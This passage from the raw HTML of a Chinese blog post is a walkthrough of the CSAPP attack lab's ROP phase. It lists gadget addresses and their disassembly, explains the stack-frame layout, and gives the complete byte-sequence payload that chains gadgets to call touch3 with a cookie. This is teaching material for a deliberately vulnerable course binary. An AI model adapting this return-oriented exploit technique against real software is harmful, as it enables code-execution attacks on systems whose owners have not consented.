</span></span><span class="line"><span class="cl">  <span class="mi">401</span><span class="nl">aab</span><span class="p">:</span>       <span class="n">c7</span> <span class="mo">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">e0</span> <span class="mi">90</span>       <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x90e08948</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="mi">401</span><span class="nl">ab1</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøòÁúüÊâæÂà∞‰∫ÜÔºå<code>48 89 e0</code>ÂØπÂ∫îÁöÑÊ±áÁºñ‰ª£Á†Å‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú∞ÂùÄ‰∏∫Ôºö<code>0x401aad</code></p>
<p>Ê†πÊçÆÊèêÁ§∫ÔºåÊúâ‰∏Ä‰∏™<code>gadget</code>‰∏ÄÂÆöË¶ÅÁî®‰∏ä</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">d6</span> <span class="o">&lt;</span><span class="n">add_xy</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">   <span class="mi">4019</span><span class="nl">d6</span><span class="p">:</span>       <span class="mi">48</span> <span class="mi">8</span><span class="n">d</span> <span class="mo">04</span> <span class="mi">37</span>             <span class="nf">lea</span>    <span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mi">4019</span><span class="nl">da</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú∞ÂùÄ‰∏∫Ôºö<code>0x4019d6</code></p>
<p>ÈÄöËøáÂêàÈÄÇÁöÑËµãÂÄºÔºåËøôÊÆµ‰ª£Á†ÅÂ∞±ËÉΩÂÆûÁé∞<code>%rsp</code>Âä†‰∏äÊÆµÂÜÖÂÅèÁßªÂú∞ÂùÄÊù•Á°ÆÂÆö<code>cookie</code>ÁöÑ‰ΩçÁΩÆ</p>
<p>Ââ©‰∏ãÈÉ®ÂàÜÊµÅÁ®ã‰∏é<code>Phase 3</code>‰∏ÄËá¥ÔºåÂ§ß‰ΩìÊÄùË∑ØÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>ÂÖàÂèñÂæóÊ†àÈ°∂ÊåáÈíàÁöÑ‰ΩçÁΩÆ</li>
<li>ÂèñÂá∫Â≠òÂú®Ê†à‰∏≠ÂæóÂÅèÁßªÈáèÁöÑÂÄº</li>
<li>ÈÄöËøá<code>lea (%rdi,%rsi,1),%rax</code>ÂæóÂà∞ cookie ÁöÑÂú∞ÂùÄ</li>
<li>Â∞Ü cookie ÁöÑÂú∞ÂùÄ‰º†Áªô<code>%rdi</code></li>
<li>Ë∞ÉÁî®<code>touch 3</code></li>
</ul>
<p>Áî±‰∫é<code>gadget</code>ÁöÑÈôêÂà∂Ôºå‰∏≠Èó¥ÁöÑÁªÜËäÇÈúÄË¶ÅÂæàÂ§öÂ∞ùËØïÔºåÂ∞ùËØïËøáÁ®ã‰∏çÂÜç‰∏Ä‰∏ÄÂàó‰∏æ‰∫ÜÔºåÁõ¥Êé•ÁªôÂá∫‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x401aad
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x4019a2
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x4019cc
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">popq</span> <span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x4019dd
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movl</span> <span class="o">%</span><span class="n">eax</span><span class="p">,</span> <span class="o">%</span><span class="n">edx</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x401a70
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movl</span> <span class="o">%</span><span class="n">edx</span><span class="p">,</span> <span class="o">%</span><span class="n">ecx</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x401a13
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movl</span> <span class="o">%</span><span class="n">ecx</span><span class="p">,</span> <span class="o">%</span><span class="n">esi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x4019d6
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">lea</span>    <span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#Âú∞ÂùÄÔºö0x4019a2
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≥®ÊÑèmovl %ecx, %esiËøôÊù°Êåá‰ª§ÂØπÂ∫î89 d1ÔºåÊà™Âèñ‰∏ãÈù¢ÈÉ®ÂàÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0000000000401a6e &lt;setval_167&gt;:
</span></span><span class="line"><span class="cl">  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
</span></span><span class="line"><span class="cl">  401a74:	c3   
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊåâÁêÜËØ¥ÂêéÈù¢ÊòØ91‰∏çÊòØ90(nop)ÔºåÊâÄ‰ª•‰∏çËÉΩÂèñÔºå‰ΩÜÂú®x86Ê±áÁºñ‰∏≠Ôºå0x91 Ë°®Á§∫ xchg eax, ecx Êåá‰ª§„ÄÇËøôÊù°Êåá‰ª§ÁöÑ‰ΩúÁî®ÊòØ‰∫§Êç¢ %eax Âíå %ecx ÂØÑÂ≠òÂô®ÁöÑÂÄº„ÄÇ‰∏çÂΩ±ÂìçÂØÑÂ≠òÂô®ÁöÑÂÄºÔºåÊâÄ‰ª•ÂèØ‰ª•„ÄÇ</p>
<h3 id="Ê†àÂ∏ßËÆ≤Ëß£-1">Ê†àÂ∏ßËÆ≤Ëß£
</h3><p>‰∏∫ËäÇÁúÅÁ©∫Èó¥ÔºåÊØè‰∏ÄË°å‰ª£Á†ÅÈÉΩÁúÅÁï•‰∫ÜÂêéÈù¢ÁöÑ<code>ret</code>Ôºå<img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w.webp"
	width="1132"
	height="796"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu9797061224875917748.webp 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu17673280219868860253.webp 1024w"
	loading="lazy"
	
		alt="Âõæ8"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="341px"
	
></p>
<p>ÈÄªËæëÂú®Âõæ‰∏äÊ†áÁöÑÂæàÊ∏ÖÊ•öÔºåËøôÈáåÂ∞±‰∏çÂÜçÁî®ÊñáÂ≠óÂÜôÂï¶ÔºÅ</p>
<p><strong>Ë¶ÅÊ≥®ÊÑè</strong>Ôºå<code>getbuf</code>ÊâßË°å<code>ret</code>ÂêéÁõ∏ÂΩì‰∫éËøõË°å‰∫Ü‰∏ÄÊ¨°<code>pop</code>Êìç‰ΩúÔºå<code>test</code>ÁöÑÊ†àÈ°∂ÊåáÈíà<code>%rsp=%rsp+0x8</code>ÔºåÊâÄ‰ª•<code>cookie</code>Áõ∏ÂØπ‰∫éÊ≠§Êó∂Ê†àÈ°∂ÊåáÈíàÁöÑÂÅèÁßªÈáèÊòØ<code>0x48</code>ËÄå‰∏çÊòØ<code>0x50</code></p>
<h3 id="solution-2">Solution
</h3><p>Ê†πÊçÆ‰∏äÂõæÁöÑÊ†àÂ∏ßÔºåÂÜôÂá∫ËæìÂÖ•Â∫èÂàóÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">ad 1a 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">a2 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">cc 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">48 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">dd 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">70 1a 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">13 1a 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">d6 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">a2 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">fa 18 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">35 39 62 39 39 37 66 61
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/en/tags/csapp/">CSAPP</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on 2024-10-05
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.body, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/">
        
        
            <div class="article-image">
                <img src="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.fd6d165890cb6fc8696f518e0f48c578_hu4307839397655323871.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CSAPP:bufferÂÆûÈ™å"
                        
                        data-hash="md5-/W0WWJDLb8hpb1GOD0jFeA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CSAPP:bufferÂÆûÈ™å</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/">
        
        
            <div class="article-image">
                <img src="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/1.4f8eafc410317f2bf041ef2b416c59e5_hu2708113943110592542.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CSAPP:bombÂÆûÈ™å"
                        
                        data-hash="md5-T46vxBAxfyvwQe8rQWxZ5Q==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CSAPP:bombÂÆûÈ™å</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline.css" />
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }

    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script type="module">
    import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';
    init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili"],"lang":"zh-CN","locale":{"admin":"Admin","placeholder":"ÊÑüË∞¢ÊÇ®ÁöÑËØÑËÆ∫"},"pageview":true,"requiredMeta":["nick"],"serverURL":"https://chenyuan1125.top","visitor":true});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Lee
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.27.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
